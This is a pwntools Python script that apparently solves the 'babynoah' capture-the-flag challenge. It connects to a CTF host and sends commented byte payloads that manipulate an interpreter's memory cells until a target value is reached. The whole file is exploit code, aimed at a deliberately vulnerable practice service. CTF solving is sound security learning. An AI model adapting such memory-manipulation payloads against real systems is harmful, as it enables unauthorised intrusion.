from pwn import *

context.arch = 'amd64'
context.os = 'linux'

io = process('nc babynoah.bctf23-codelab.kctf.cloud 1337', shell=True)
print(io.recvregex(b':\n'))
p1 =  b'>' # move right
p1 += b'\x0d' # padding to make it easier to manipulate the sum. Note that any non-special oprations character such as this or 0x7f will add 1 to the int value at 0x4034, which means that after every loop through the input buffer, the below buffer indices in the comment will be increased by 1. However, since the offsets remain the same, this does not affect my calculations below.
p1 += b'\xc8\x21\x00\x21\x2b\x3a' # operations to set 0x4038[1] = 2 and [0x4034] = 2. 0xc8 is my chosen starting value to modify until it becomes 0x40 aka end character.
p1 += b'\x7f\x7f\x21\x7f\x21\x2b\x3a' # operations to set 0x4038[3] = 2 and [0x4034] = 4
p1 += b'\x7f\x67\x3a' # set [0x4034] = 5; 0x67 will set 0x4038[[0x4034]-2] = input[0x4038[[0x4034]-2] + 0x4038[[0x4034]-1] * 0x18], which is equivalent to 0x4038[3] = input[2]
p1 += b'\x7f\x21\x2b\x7f\x21' # the operation 0x7f 0x21 0x2b will add 1 to 0x4038[3]. This will be repeated 8 times
p1 += b'v' # move down
io.sendline(p1)

p2 = '^v<' #the left char moves up to the beginning, the middle char moves down.
p2 += b'\x70' # keep in mind that 0x4038 is set to 4. Operation to set input[0x4038[[0x4034] - 3] + 0x4038[[0x4034] - 2] * 0x18] = 0x4038[[0x4034]-1], which is equivalent to input[2] = 0x4038[3] = input[2] + 8
p2 += b'\x2b\x21\x7f' * 6 + b'\x2b' # continuation of the addition to input[2]
p2 += b'<'
io.sendline(p2)
#io.sendline(b'>'+b'\x0d\xc8\x21\x00\x21\x2b\x3a\x7f\x7f\x21\x7f\x21\x2b\x3a\x7f\x67\x3a'+b'\x7f\x21\x2b\x7f\x21'+b'v')
#io.sendline(b'^v'+b'<'*1+b'\x70'+b'\x2b\x21\x7f'*6+b'\x2b'+b'<')
io.sendline(b'^' + b'>'*2+b'\x4b\x7e'*6+b'\x4c\x7e\x2e\x7e\x3b\x7e\x39\x7e'+b'v' ) # some inputs are tweaked so that the final sum reaches the target exactly
io.sendline(b'^'+b'v'+b'<'*22)
io.sendline(b'^'+b'>'*22 + b'v')
io.sendline(b'^' + b'v'+b'<'*22 )
io.sendline(b'^' + b'>'*22+b'v' )
io.sendline(b'^' +b'<'*23) # the remaining inputs are direction characters to ultimately loop back to the beginning. The loop will happen until input[2] is set to 0x40 

print(io.recvline())
print(io.recvline())
print(io.recvline())

